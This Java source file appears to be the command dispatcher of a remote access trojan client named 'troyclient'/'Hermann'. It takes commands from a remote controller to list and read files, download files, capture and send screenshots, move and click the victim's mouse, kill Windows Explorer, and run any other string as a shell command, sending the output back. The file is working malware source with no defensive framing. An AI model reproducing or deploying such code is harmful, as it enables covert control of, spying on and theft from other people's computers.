package ch.lebois.troyclient.main;

import ch.lebois.troyclient.chat.Chat;
import ch.lebois.troyclient.functions.Screenshot;
import ch.lebois.troyclient.service.BonziFunctions;
import ch.lebois.troyclient.service.Console;
import ch.lebois.troyclient.service.DownloadService;
import ch.lebois.troyclient.service.FileService;
import ch.lebois.troyclient.service.ImageSender;
import ch.lebois.troyclient.service.ListFiles;
import ch.lebois.troyclient.service.Mouse;
import java.util.ArrayList;

/**
 * @author Felix
 * @date 13.03.2018
 * <p>
 * Project: Hermann
 * Package: ch.lebois.troyclient.main
 **/
public class CommandList {

    private Command message = new Command("msg") {
        @Override
        public void run(String command) {
            Chat chat = Chat.getInstance();
            chat.addMessage("Hermann: " + command.substring(6));
            Console.execute(command);
            SystemVariables.SENDER.send("message", "CHAT - Hermann: " + command.substring(6));
        }
    };

    private Command ls = new Command("ls") {
        @Override
        public void run(String command) {
            SystemVariables.SENDER.send("commandout", System.getProperty("user.dir") + " $ " + command);
            new ListFiles().listFiles(command);
        }
    };

    private Command read = new Command("read") {
        @Override
        public void run(String command) {
            SystemVariables.SENDER.send("commandout", System.getProperty("user.dir") + " $ " + command);
            FileService.readFile(command);
        }
    };

    private Command download = new Command("download") {
        @Override
        public void run(String command) {
            new DownloadService().download(command.split(" ")[1], command.split(" ")[2]);
        }
    };

    private Command desktop = new Command("desktop") {
        @Override
        public void run(String command) {
            new BonziFunctions().showDesktop();
        }
    };

    private Command kill = new Command("kill") {
        @Override
        public void run(String command) {
            new BonziFunctions().killExplorer();
        }
    };

    private Command screenshot = new Command("screenshot") {
        @Override
        public void run(String command) {
            SystemVariables.SENDER.send("commandout", "Sending Img");
            new ImageSender().sendBytes(new Screenshot().takeScreenshot());
        }
    };

    private Command mouseMove = new Command("mousemove") {
        @Override
        public void run(String command) {
            Mouse mouse = new Mouse();
            mouse.moveMouse(command);
            SystemVariables.SENDER.send("commandout", "Mouse moved to " + mouse.getX() + " " + mouse.getY());
        }
    };

    private Command mouseClick = new Command("mouseclick") {
        @Override
        public void run(String command) {
            new Mouse().mouseClick();
            SystemVariables.SENDER.send("commandout", "Mouse clicked");
        }
    };

    private Command refreshTime = new Command("refresh") {
        @Override
        public void run(String command) {
            SystemVariables.REFRESHTIME = Integer.parseInt(command.split(" ")[1]) * 1000;
            SystemVariables.SENDER.send("commandout", "Command refresh set to " + SystemVariables.REFRESHTIME / 1000 + "s");
            SystemVariables.SENDER.send("refresh", String.valueOf(SystemVariables.REFRESHTIME / 1000));
        }
    };


    public void readCommand(String command) {
        for (Command commandElem : getCommands()) {
            if (command.startsWith(commandElem.getCommand())) {
                commandElem.run(command);
                return;
            }
        }
        executeNormalCommand(command);
    }

    private ArrayList<Command> getCommands() {
        ArrayList<Command> commands = new ArrayList<>();
        commands.add(message);
        commands.add(ls);
        commands.add(read);
        commands.add(download);
        commands.add(desktop);
        commands.add(kill);
        commands.add(screenshot);
        commands.add(mouseMove);
        commands.add(mouseClick);
        commands.add(refreshTime);
        return commands;
    }

    private void executeNormalCommand(String command) {
        try {
            if (!command.equals("")) {
                for (String out : Console.execute(command)) {
                    SystemVariables.SENDER.send("commandout", out);
                }
            }
        } catch (NullPointerException e) {
            System.err.println("Could not execute '" + command + "'");
            SystemVariables.SENDER.send("errorout", "No command '" + command + "' found");
        }
    }

}
